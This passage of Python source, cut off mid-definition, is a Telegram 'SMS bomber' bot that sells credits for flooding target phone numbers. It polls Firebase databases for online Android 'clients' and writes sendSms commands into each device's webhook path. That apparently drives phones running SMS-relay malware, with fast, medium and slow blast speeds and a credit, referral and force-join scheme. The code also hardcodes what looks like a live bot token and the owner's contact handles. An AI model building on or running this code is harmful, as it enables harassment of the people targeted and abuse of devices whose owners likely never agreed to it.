# 🗿 Bot Developer - @BRIJESH_21
# 🔰 Developer Channel - @BRXOTEAM

import asyncio, json, os, time, logging, random, string, threading
from datetime import datetime
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.enums import ChatMemberStatus
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

PREMIUM_STYLE_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝛛𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁"
)

def sc(text: str) -> str:
    return str(text).translate(PREMIUM_STYLE_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {text}".strip() if fallback_emoji else text
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {text}".strip() if fallback_emoji else text
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=sc(text), request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        setattr(kb_btn, "style", style)
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

MAIN_OWNER = 7402810994 
SUPER_ADMIN_NAME = "@sex_with_slutz"
SUPER_ADMIN_LINK = "https://t.me/sex_with_slutz"
SUPER_ADMINS = [7402810994]

BOT_TOKEN = os.getenv("8667072382:AAFExs12mbdaF-_e6BFgS2eqNJj7o9G0Jb0").strip()
LOG_CHANNEL_ID = -1003874728528

BOT_DISPLAY_NAME = "𝐓𝐡𝐞 𝐘𝐮𝐬𝐡𝐨𝐯 𝐁𝐎𝐌𝐁𝐄𝐑 <𝟑 .ᐟ"
OFFICIAL_GROUP_ID = -1003796921821
OFFICIAL_GROUP_LINK = os.getenv("OFFICIAL_GROUP_LINK", "https://t.me/Resinance_chat").strip()
PREMIUM_VERSION = "V6.9 PREMIUM UI"

_DATA_FILE = "blast_data.json"
_VERSION = PREMIUM_VERSION
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": []
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    mode = "🟢 FREE MODE" if d.get("free_mode") else "🟡 APPROVAL MODE"
    fj = d.get("force_join", {})
    fj_status = "🟢 ONLINE" if fj.get("enabled") else "⚫ OFF"
    protected_count = len(PROTECTED_NUMBERS)
    return (
        "╭━━━〔 👑 BRX OWNER CORE 〕━━━╮\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        "┃  <i>Command center • owner access</i>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ 👥 Users       <b>{len(users)}</b>   │ 👑 Owners <b>{len(owners)}/6</b>\n"
        f"┃ 🛡 Admins      <b>{len(admins)}</b>   │ 📹 Videos <b>{len(videos)}</b>\n"
        f"┃ 🔥 Firebase    <b>{len(fbs)}</b>   │ ⚡ Active <b>{active_sessions}</b>\n"
        f"┃ 📤 Sent        <b>{stats.get('total_sent', 0)}</b>   │ ❌ Failed <b>{stats.get('total_failed', 0)}</b>\n"
        f"┃ 🔒 Protected   <b>{protected_count}</b>   │ 🔗 Force Join <b>{fj_status}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ 🔓 Access  <b>{mode}</b>\n"
        f"┃ 📡 Scanner <b>{get_scan_status()}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ ✦ Select a module below.\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    return (
        "╭━━━〔 🛡 BRX ADMIN CORE 〕━━━╮\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        "┃  <i>Operations • moderation • insights</i>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ 👥 Users      <b>{len(users)}</b>\n"
        f"┃ 📹 Videos     <b>{len(videos)}</b>\n"
        f"┃ 🚫 Banned     <b>{len(banned)}</b>\n"
        f"┃ 📤 Sent       <b>{stats.get('total_sent', 0)}</b>\n"
        f"┃ ❌ Failed     <b>{stats.get('total_failed', 0)}</b>\n"
        f"┃ 🔥 Firebase   <b>{len(d.get('firebases', []))}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 🟢 Admin Access <b>ACTIVE</b>\n"
        f"┃ 📡 Scanner      <b>{get_scan_status()}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ ✦ Choose an action below.\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    credits = udata.get("credits", 0)
    return (
        "╭━━━〔 ⚡ BRX USER CORE 〕━━━╮\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        f"┃  👤 <b>{esc_html(udata.get('name', 'User'))}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ 🏷 Role      {role_tag(uid, d)}\n"
        f"┃ 💰 Credits   <b>{credits}</b>\n"
        f"┃ 🔢 Uses      <b>{udata.get('uses', 0)}</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 🟢 System    <b>READY</b>\n"
        "┃ ⚡ Response  <b>ONLINE</b>\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ ✦ Choose a module below.\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("⛔ Disable Free Mode", "owner:free:off") if d.get("free_mode") else ("🟢 Enable Free Mode", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 SEND", "owner:send"), btn("🔥 FIREBASE", "owner:fb:menu")],
        [btn("📹 VIDEOS", "owner:videos:menu"), btn("👑 OWNERS", "owner:owners:menu")],
        [btn("🛡 ADMINS", "owner:admins:menu"), btn("👥 USERS", "owner:users:list")],
        [btn("🚫 BAN", "owner:ban"), btn("🔓 UNBAN", "owner:unban:menu")],
        [btn("📢 BROADCAST", "owner:broadcast"), btn("📊 STATS", "owner:stats")],
